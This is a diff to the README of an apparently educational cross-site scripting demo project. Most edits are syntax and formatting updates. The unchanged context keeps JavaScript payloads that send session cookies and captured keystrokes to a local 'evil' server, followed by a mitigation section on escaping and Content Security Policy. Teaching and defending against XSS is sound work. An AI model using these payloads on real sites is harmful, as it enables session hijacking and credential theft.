@@ -6,8 +6,6 @@ Example cross-site scripting vulnerabilities in action.
 ## Requirements
 
 * [Node.js](https://nodejs.org/en/) - you can use either version (LTS or latest)
-  * For Windows - use the installation package from the node website
-  * For Linux and Mac - use [nvm](https://github.com/creationix/nvm) to install node
 * [Git](https://git-scm.com/downloads)
 
 
@@ -37,7 +35,7 @@ npm install
 
 Now we can run the local web server using Node.js:
 ```bash
-node server.js
+npm run server
 ```
 If successful, you should see the following message: `Server listening at localhost:3000`. This means that a local web server is now running and is listening for requests at [localhost:3000](http://localhost:3000/). Open your browser and click the link.
 
@@ -91,7 +89,7 @@ If successful, you should see the contents of the session cookie printed in an a
 
 Now before continuing, we will need to start our "evil" web server. Run the following command in a second terminal window:
 ```bash
-node evil-server.js
+npm run evil-server
 ```
 
 And now try to use the following code with the XSS vulnerability to steal the session cookie:
@@ -106,7 +104,7 @@ Fun times!
 
 Here's the JavaScript code from the last example in a readable form:
 ```js
-var img = document.createElement('img');
+const img = document.createElement('img');
 img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
 document.querySelector('body').appendChild(img);
 ```
@@ -119,8 +117,8 @@ Encode the above HTML and use it as the search query, or [try this link](http://
 
 Here's the JavaScript code from the last example in a readable form:
 ```js
-var timeout;
-var buffer = '';
+let timeout;
+let buffer = '';
 document.querySelector('body').addEventListener('keypress', function(event) {
 	if (event.which !== 0) {
 		clearTimeout(timeout);
@@ -147,17 +145,18 @@ Imagine instead of localhost:3000, this was your bank's website. And you see a l
 ## Mitigation
 
 Let's stop scaring you for a moment and see if we can fix this. In this example project, at the root, the XSS vulnerability is caused by inserting unsafe ("unescaped") HTML into the page. In the `public/index.html` file, you will find the following function:
+
 ```js
 function showQueryAndResults(q, results) {
 
-	var resultsEl = document.querySelector('#results');
-	var html = '';
+	const resultsEl = document.querySelector('#results');
+	let html = '';
 
 	html += '<p>Your search query:</p>';
 	html += '<pre>' + q + '</pre>';
 	html += '<ul>';
 
-	for (var index = 0; index < results.length; index++) {
+	for (let index = 0; index < results.length; index++) {
 		html += '<li>' + results[index] + '</li>';
 	}
 
@@ -166,22 +165,24 @@ function showQueryAndResults(q, results) {
 	resultsEl.innerHTML = html;
 }
 ```
+
 This function is taking the search query (`q`) and inserting it as HTML into the `<div id="results"></div>` element. And since HTML allows JavaScript to be run inline via a number of different attributes, this provides a nice opportunity for XSS.
 
 There are a number of techniques we can use to prevent this particular XSS vulnerability.
 
 We can change our application/website code to treat user input (the `q` parameter) strictly as text content. For example, here is a fixed up version of the above function:
+
 ```js
 function showQueryAndResults(q, results) {
 
-	var resultsEl = document.querySelector('#results');
-	var html = '';
+	const resultsEl = document.querySelector('#results');
+	let html = '';
 
 	html += '<p>Your search query:</p>';
 	html += '<pre></pre>';
 	html += '<ul>';
 
-	for (var index = 0; index < results.length; index++) {
+	for (let index = 0; index < results.length; index++) {
 		html += '<li>' + results[index] + '</li>';
 	}
 
@@ -189,7 +190,7 @@ function showQueryAndResults(q, results) {
 
 	resultsEl.innerHTML = html;
 
-	var queryTextEl = document.querySelector('#results pre');
+	const queryTextEl = document.querySelector('#results pre');
 	queryTextEl.textContent = q;
 }
 ```
@@ -198,9 +199,11 @@ Replace the function in your index.html with this fixed version and try the XSS 
 Another technique we can use is [Content Security Policy](https://www.owasp.org/index.php/Content_Security_Policy) declarations to instruct the browser which types of code to run (and from where).
 
 For example, we can instruct the browser to only run JavaScript code from source files on the same domain. To do this, we add a special meta tag to the head of our HTML document:
-```
+
+```html
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
 ```
+
 But adding this tag to our index.html will break our page, because it disallows the inline JavaScript from running. To fix this, we will need to move our JavaScript to a separate file (ie. `search.js`).
 
 This is a very good solution to stop most XSS vulnerabilities from becoming harmful. But there is a major issue. Most applications will break when suddenly adding these directives. Changes have to be made to get the applications working again.
